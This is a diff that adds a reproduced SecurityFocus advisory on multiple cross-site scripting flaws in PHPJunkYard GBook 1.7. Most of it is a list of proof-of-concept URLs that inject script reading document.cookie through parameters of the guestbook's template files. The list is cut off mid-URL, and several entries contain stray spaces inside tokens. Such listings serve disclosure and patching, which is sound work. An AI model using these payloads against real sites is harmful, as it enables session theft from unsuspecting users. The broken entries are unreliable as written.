@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/48905/info
+
+PHPJunkYard GBook is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PHPJunkYard GBook 1.7 is vulnerable; other versions may also be affected. 
+
+
+
+http://www.example.com/templates/default/admin_reply.php?error=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/admin_reply.php?comments=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29 ;%3C/script%3E
+http://www.example.com/templates/default/admin_reply.php?nosmileys=%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script %3E
+http://www.example.com/templates/default/admin_reply.php?num=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/templates/default/comments.php?name=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/comments.php?from=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/comments.php?name=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/comments.php?email=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/comments.php?added=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/comments.php?i=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/templates/default/admin_tasks.php?error=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/admin_tasks.php?task=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/admin_tasks.php?task_description=%3Cscript%3Ealert%28document.cookie%29;%3C/sc ript%3E
+http://www.example.com/templates/default/admin_tasks.php?action=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script %3E
+http://www.example.com/templates/default/admin_tasks.php?button=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script %3E
+http://www.example.com/templates/default/admin_tasks.php?num=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/templates/default/emoticons_popup.php?list_emoticons=%3Cscript%3Ealert%28document.cookie%29;%3C/ script%3E
+
+http://www.example.com/templates/default/error.php?myproblem=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/error.php?backlink=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/no_comments.php?lang[t06]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/overall_footer.php?settings[pages_top]=%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+http://www.example.com/templates/default/overall_footer.php?settings[show_nospam]=1&settings[target]=%22%3E%3Cscrip t%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/overall_footer.php?settings[show_nospam]=1&settings[tpl_path]=%22%3E%3Cscr ipt%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/templates/default/overall_header.php?settings[gbook_title]=%3Cscript%3Ealert%28document.cookie%2 9;%3C/script%3E
+http://www.example.com/templates/default/sign_form.php?name=%22%3E%3Cscript%3Ealert%28document.cook
